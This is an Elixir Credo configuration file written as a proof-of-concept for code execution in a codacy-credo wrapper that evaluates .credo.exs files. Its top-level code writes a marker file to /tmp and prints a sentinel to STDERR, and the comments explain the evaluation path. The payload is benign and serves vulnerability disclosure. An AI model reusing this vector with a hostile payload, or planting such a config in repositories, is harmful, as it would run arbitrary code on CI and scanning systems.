# PoC payload - benign marker only. RCE via codacy-credo: the wrapper's no-patterns
# branch calls Credo.ConfigFile.read_or_default(..., "/src/") which evaluates this .credo.exs
# via Code.eval_string (Credo ExsLoader.parse, safe=false by default). Top-level Elixir runs.
marker = "/tmp/codacy-credo-rce-confirmed.txt"
cwd = File.cwd!()
File.write!(marker, "RCE confirmed via .credo.exs Code.eval_string. cwd=#{cwd} marker=#{marker}\n")

# Emit the sentinel to STDERR so it surfaces in the codacy step output (proves our Elixir ran).
IO.puts(:stderr, "CODEX_RCE_CREDO_PROOF_#{cwd}_marker_written_#{marker}")

%{
  configs: [
    %{
      name: "default",
      files: %{included: ["lib/"], excluded: []},
      strict: false,
      checks: []
    }
  ]
}
